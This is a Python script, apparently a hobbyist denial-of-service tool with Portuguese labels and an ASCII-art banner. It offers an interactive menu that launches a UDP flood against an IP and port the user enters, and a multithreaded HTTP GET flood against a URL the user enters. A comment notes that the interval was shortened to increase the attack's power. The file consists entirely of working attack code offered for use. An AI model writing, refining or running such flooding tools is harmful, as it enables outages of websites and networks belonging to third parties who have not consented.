import threading
import requests
import time
import socket

# Flags para controle de ataques
parar_udp_crash = threading.Event()
parar_killer_get = threading.Event()

def exibir_arte_ascii():
    arte_ascii = '''
⠀                ⠀⣀⠀⠤⠴⠶⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠂⠉⡇⠀⠀⠀⢰⣿⣿⣿⣿⣧⠀⠀⢀⣄⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣶⣶⣷⠀⠀⠀⠸⠟⠁⠀⡇⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠟⢹⣋⣀⡀⢀⣤⣶⣿⣿⣿⣿⣿⡿⠛⣠⣼⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⢁⣾⣿⣿⣿⣿⣿⣿⡿⢁⣾⣿⣿⣿⠁⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⠿⠇⠀⠀⠀⠀Antes eu so tinha Computador da Minha Mae, e nos se davamos bem >:)
⠀⠀⠳⣤⣙⠟⠛⢻⠿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣇⠘⠉⠀⢸⠀⢀⣠⠀⠀⠀
⠀⠀⠀⠈⠻⣷⣦⣼⠀⠀⠀⢻⣿⣿⠿⢿⡿⠿⣿⡄⠀⠀⣼⣷⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣿⣿⣿⣶⣄⡈⠉⠀⠀⢸⡇⠀⠀⠉⠂⠀⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣷⣤⣀⣸⣧⣠⣤⣴⣶⣾⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
'''
    return arte_ascii

def ataque_udp_crash(ip, porta, pacotes_por_segundo, parar_evento):
    try:
        soquete = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_dados = b'\xff' * 1024
        while not parar_evento.is_set():
            for _ in range(pacotes_por_segundo):
                soquete.sendto(bytes_dados, (ip, porta))
            time.sleep(1 / pacotes_por_segundo)
    except socket.error as e:
        print(f"Erro ao enviar pacotes UDP: {e}")

def ataque_killer_get(url, threads_total, pacotes_por_thread, intervalo, parar_evento):
    def enviar_requisicao():
        try:
            while not parar_evento.is_set():
                for _ in range(pacotes_por_thread):
                    requests.get(url)
                time.sleep(intervalo)
        except requests.RequestException as e:
            print(f"Erro ao enviar pacotes: {e}")

    threads = []
    for _ in range(threads_total):
        thread = threading.Thread(target=enviar_requisicao)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
    print(exibir_arte_ascii())

    while True:
        comando = input("Digite um comando: ")
        if comando.lower() == 'attackip':
            ip = input("Digite o IP: ")
            porta = int(input("Digite a porta: "))
            pacotes_por_segundo = 8000000000000
            parar_udp_crash.clear()
            ataque_udp_crash(ip, porta, pacotes_por_segundo, parar_udp_crash)
        elif comando.lower() == 'attack':
            url = input("Digite a URL: ")
            threads_total = int(input("Digite o número de threads: "))
            pacotes_por_thread = 40000
            intervalo = 0.01  # Intervalo reduzido para aumentar a potência
            parar_killer_get.clear()
            ataque_killer_get(url, threads_total, pacotes_por_thread, intervalo, parar_killer_get)
        elif comando.lower() == 'parar':
            parar_udp_crash.set()
            parar_killer_get.set()
            print("Todos os ataques foram interrompidos.")
        else:
            print("Comando inválido. Tente novamente.")

if __name__ == "__main__":
    main()
